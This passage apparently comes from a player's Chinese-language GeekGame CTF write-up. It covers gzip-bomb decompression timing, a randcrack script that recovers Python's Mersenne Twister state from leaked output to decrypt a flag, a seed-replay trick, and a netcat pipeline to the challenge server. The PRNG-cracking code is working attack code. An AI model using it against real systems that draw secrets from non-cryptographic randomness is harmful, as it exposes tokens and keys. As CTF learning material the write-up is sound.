但是感觉实现起来很麻烦喵。最后没时间了没尝试做喵。

另外判题脚本只输出最终结果，本地调试时如果要在 `filterd.py` 里打印可以
`print(file=sys.stderr)` 喵。

谢谢喵。

## 未来磁盘

flag1 先小规模测试一下，感觉速度还行，直接开跑。

```shell
time gzip -dck flag1.gz | gzip -dc | wc -c
# 7547056623
#
# real    0m31.154s
# user    0m29.529s
# sys     0m6.419s
time gzip -dck flag1.gz | gzip -dc | gzip -dc | tr -d '\0'
```

差不多 9 小时可以跑完。

之前也看过一点 gzip、zlib 和 DEFLATE 的 RFC，没看完，主要是 bit-oriented format
需要耐心理解。猜测是跳过一些重复的内容。

第二阶段看了提示，猜测大致正确，但没尝试。

## 小章鱼的曲奇

flag1 前面的部分是 random 的结果，跟 [geekgame-1st
的扫雷](https://github.com/PKU-GeekGame/geekgame-1st/tree/master/writeups/liangjs#%E6%89%AB%E9%9B%B7)
一样用 `randcrack` 可以预测出后面的内容，再异或一次就能还原。

```python
import randcrack

def xor_arrays(a, b, *args):
    if args:
        return xor_arrays(a, xor_arrays(b, *args))
    return bytes([x ^ y for x, y in zip(a, b)])

def main() -> None:
    N = 624
    Zero_length = 2500

    ancient_words = bytes.fromhex(input())
    # print(type(ancient_words))
    # print(len(ancient_words))
    rc = randcrack.RandCrack()
    for i in range(N):
        rc.submit(int.from_bytes(ancient_words[i * 4: i * 4 + 4], 'little'))
    for start in range(N * 4, Zero_length, 4):
        p = rc.predict_getrandbits(4 * 8).to_bytes(4, 'little')
        expected = ancient_words[start: start + 4]
        if p != expected:
            print(f'Mismatch at {start} {p.hex()} {expected}')
            exit(1)
    cookie_length = len(ancient_words) - Zero_length
    random_bytes = rc.predict_getrandbits(cookie_length * 8).to_bytes(cookie_length, 'little')
    print(xor_arrays(random_bytes, ancient_words[Zero_length:]))

if __name__ == "__main__":
    main()
```

flag2 比赛时没做出来，看到循环异或就头大。后来又看了下，原来初始化时 `key`
的内容是
[循环使用](https://github.com/python/cpython/blob/cb1bf89c4066f30c80f7d1193b586a2ff8c40579/Modules/_randommodule.c#L232)
的，所以把 `key` 重复若干次还是等价的。痛失 173 分。

flag3 要求输入的 seed 随机结果跟指定的 seed 的结果相同，但不像 flag2，它没有要求两个
seed 不同。只要直接把原来的 seed 输入回去就行。注意长度会超过 4096。pwntools
不顺手，写点脚本拼手速复制粘贴。

```python
def f():
    s = pyperclip.paste()
    l = []
    for start in range(0, len(s), 2048):
            l.append(s[start: start + 2048])
            l.append('\n')
    l.append('#')
    pyperclip.copy(''.join(l))
```

```shell
stdbuf -o 0 tr -d '\n' \
    | stdbuf -i 0 -o 0 tr "#" '\n' \
    | stdbuf -i 0 -o 0 nc prob08.geekgame.pku.edu.cn 10008
```

## 华维码

最后的时间在写这题。抄了一部分自己 Hackergame 2021 马赛克的
[代码](https://github.com/USTC-Hackergame/hackergame2021-writeups/blob/master/players/Testla/23-%E9%A9%AC%E8%B5%9B%E5%85%8B/main.py)
，没写完。

写题解时又写了一会，还差检查二维码能不能解码的部分。放在题解里供参考。
找到解以后打算生成同名文件，用 Chromium 的 Local Overrides 替换，方便手解华容道。

## 感想

感觉今年变卷了不少（是你太弱了吧）。

看题目环境也能学到不少东西，虽然不动手估计很快忘掉。
